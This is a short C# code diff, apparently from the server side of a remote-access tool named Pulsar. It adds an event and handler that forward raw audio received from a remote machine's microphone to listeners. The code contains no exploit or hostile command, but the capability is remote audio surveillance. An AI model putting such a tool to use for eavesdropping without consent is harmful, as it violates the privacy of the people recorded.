@@ -43,6 +43,22 @@ namespace Pulsar.Server.Messages
         public event MicrophoneChangedEventHandler MicrophoneChanged;
 
         /// <summary>
+        /// Represents the method that will handle audio data reception.
+        /// </summary>
+        /// <param name="sender">The message processor which raised the event.</param>
+        /// <param name="audioData">The raw audio data bytes.</param>
+        public delegate void AudioDataReceivedEventHandler(object sender, byte[] audioData);
+
+        /// <summary>
+        /// Raised when audio data is received from the remote microphone.
+        /// </summary>
+        /// <remarks>
+        /// Handlers registered with this event will be invoked on the
+        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
+        /// </remarks>
+        public event AudioDataReceivedEventHandler AudioDataReceived;
+
+        /// <summary>
         /// Reports changed microphones.
         /// </summary>
         /// <param name="devices">All currently available microphones.</param>
@@ -53,6 +69,19 @@ namespace Pulsar.Server.Messages
                 var handler = MicrophoneChanged;
                 handler?.Invoke(this, (List<Tuple<int, string>>)dvce);
             }, devices);
+        }
+
+        /// <summary>
+        /// Reports received audio data.
+        /// </summary>
+        /// <param name="audioData">The raw audio data bytes.</param>
+        private void OnAudioDataReceived(byte[] audioData)
+        {
+            SynchronizationContext.Post(data =>
+            {
+                var handler = AudioDataReceived;
+                handler?.Invoke(this, (byte[])data);
+            }, audioData);
         }
 
         /// <summary>
@@ -223,6 +252,8 @@ namespace Pulsar.Server.Messages
                     {
                         return;
                     }
+
+                    OnAudioDataReceived(message.Audio);
 
                     _provider.AddSamples(message.Audio, 0, message.Audio.Length);
                     message.Audio = null;
